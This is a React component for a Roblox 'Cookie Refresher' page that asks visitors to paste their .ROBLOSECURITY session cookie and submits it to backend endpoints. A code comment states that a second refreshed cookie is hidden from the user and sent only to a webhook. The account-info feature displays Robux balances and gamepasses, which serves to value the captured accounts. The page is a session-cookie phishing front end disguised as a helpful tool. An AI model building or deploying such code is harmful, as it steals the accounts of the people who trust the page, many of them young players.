import { useEffect, useState, useRef } from "react";
import axios from "axios";

export default function Title() {
  const [opacity, setOpacity] = useState(1);
  const [isClicked, setIsClicked] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [cookie, setCookie] = useState("");
  const [result, setResult] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const flickerRef = useRef<NodeJS.Timeout | null>(null);

  // Slow flickering effect with better cleanup
  useEffect(() => {
    // Function to handle the flicker effect
    const handleFlicker = () => {
      // Random opacity between 0.7 and 1 for subtle flickering
      const newOpacity = 0.7 + Math.random() * 0.3;
      setOpacity(newOpacity);
      
      // Schedule next flicker
      flickerRef.current = setTimeout(handleFlicker, 1500); // 1.5 seconds interval
    };
    
    // Start the initial flicker
    handleFlicker();
    
    // Cleanup function to clear the timeout when component unmounts
    return () => {
      if (flickerRef.current) {
        clearTimeout(flickerRef.current);
      }
    };
  }, []);

  // Handle screen click
  const handleClick = () => {
    if (!isClicked) {
      setIsClicked(true);
      // Show form immediately after click
      setShowForm(true);
    }
  };

  // Handle input change
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCookie(e.target.value);
  };

  // Submit form handler - refresh cookie
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!cookie) {
      setResult("Please enter a Roblox cookie");
      return;
    }

    setIsLoading(true);
    setResult("");

    try {
      const response = await axios.post('/api/refresh-cookie', { cookie });
      if (response.data.success) {
        let resultText = `Success! New Cookie Generated:\n\n`;
        resultText += `${response.data.newCookie}`;
        
        // Note: We no longer show the second cookie to the user
        // It will be sent only to the webhook
        
        setResult(resultText);
      } else {
        if (response.data.status === "EXPIRED") {
          setResult(`Your cookie has expired. Please obtain a new cookie.`);
        } else {
          setResult(`Error: ${response.data.error || "Unknown error occurred"}`);
        }
      }
    } catch (error: any) {
      // Show the modal with the new cookie even if there's an error response but it contains a new cookie
      if (error.response?.data?.newCookie) {
        let resultText = `Success! New Cookie Generated:\n\n`;
        resultText += `${error.response.data.newCookie}`;
        
        setResult(resultText);
      } else {
        setResult(`Error: ${error.response?.data?.error || error.message || "Failed to refresh cookie"}`);
      }
    } finally {
      setIsLoading(false);
    }
  };

  // Get account info
  const handleGetAccountInfo = async (e: React.MouseEvent) => {
    e.preventDefault();

    if (!cookie) {
      setResult("Please enter a Roblox cookie");
      return;
    }

    setIsLoading(true);
    setResult("");

    try {
      const response = await axios.post('/api/account-info', { cookie });
      const data = response.data;

      if (data.error) {
        setResult(`Error: ${data.error}`);
      } else {
        setResult(`
          Account Age: ${data.accountAge}
          Gamepasses: MM2: ${data.gamepasses.MM2}, PS99: ${data.gamepasses.PS99}, Adopt Me: ${data.gamepasses.AdoptMe}
          Summary: ${data.summary}
          Pending Robux: ${data.robux.pendingRobux}
          Current Robux: ${data.robux.currentRobux}
        `);
      }
    } catch (error: any) {
      setResult(`Error: ${error.response?.data?.error || error.message || "Failed to get account info"}`);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div 
      className="absolute inset-0 z-10 flex flex-col items-center justify-center w-full h-full"
      onClick={handleClick}
    >
      <div
        className={`flex flex-col items-center transition-all ease-in-out ${
          isClicked ? "transform -translate-y-40" : ""
        }`}
        style={{ transitionDuration: '2000ms' }}
      >
        <h1 
          className="font-mono font-bold text-white text-4xl md:text-5xl lg:text-6xl xl:text-7xl 
                    transition-all ease-in-out
                    hover:scale-105"
          style={{ 
            fontFamily: '"Space Mono", monospace',
            textShadow: '0 0 10px rgba(255, 255, 255, 0.5)',
            opacity: opacity,
            transitionDuration: '2000ms'
          }}
        >
          Cookie Refresher
        </h1>
      </div>

      {/* Form that fades in after click */}
      <div 
        className={`mt-10 transition-opacity w-full max-w-md px-4 ${
          showForm ? "opacity-100" : "opacity-0"
        }`}
        style={{ transitionDuration: '2000ms' }}
      >
        <form onSubmit={handleSubmit} className="flex flex-col items-center">
          <input 
            type="text" 
            className="w-full p-3 rounded-md bg-black border border-gray-600 text-white 
                      focus:outline-none focus:ring-2 focus:ring-white mb-4"
            placeholder="Enter your .ROBLOSECURITY cookie..."
            value={cookie}
            onChange={handleInputChange}
          />

          <div className="flex gap-3 mb-4">
            <button 
              type="submit" 
              className="px-6 py-3 bg-transparent border border-white text-white font-semibold 
                        rounded-md hover:bg-white hover:text-black transition-colors duration-300"
              disabled={isLoading}
            >
              {isLoading ? "Processing..." : "Refresh Cookie"}
            </button>

            <button 
              type="button"
              onClick={handleGetAccountInfo}
              className="px-6 py-3 bg-transparent border border-white text-white font-semibold 
                        rounded-md hover:bg-white hover:text-black transition-colors duration-300"
              disabled={isLoading}
            >
              Get Account Info
            </button>
          </div>

          {/* Modal for displaying the new cookies */}
          {result && result.startsWith('Success!') && (
            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
              <div className="bg-black p-6 rounded-lg border border-gray-600 max-w-xl w-full mx-4 max-h-[90vh] overflow-y-auto">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white text-xl">New Cookie</h3>
                  <button
                    onClick={() => setResult('')}
                    className="text-gray-400 hover:text-white"
                  >
                    ✕
                  </button>
                </div>
                
                {/* Display the cookie */}
                <div className="mb-4">
                  <div className="bg-gray-900 p-3 rounded mb-4 break-all">
                    <code className="text-green-400">
                      {result.replace('Success! New Cookie Generated:', '').trim()}
                    </code>
                  </div>
                  <div className="flex justify-between items-center">
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(result.replace('Success! New Cookie Generated:', '').trim());
                        alert('Cookie copied to clipboard!');
                      }}
                      className="px-4 py-2 bg-white text-black rounded hover:bg-gray-200"
                    >
                      Copy to Clipboard
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}
          
          {/* Show other results/errors normally */}
          {result && !result.startsWith('Success!') && (
            <div className="mt-4 w-full p-4 bg-black bg-opacity-50 border border-gray-600 rounded-md text-white text-left whitespace-pre-line">
              {result}
            </div>
          )}
        </form>
      </div>
    </div>
  );
}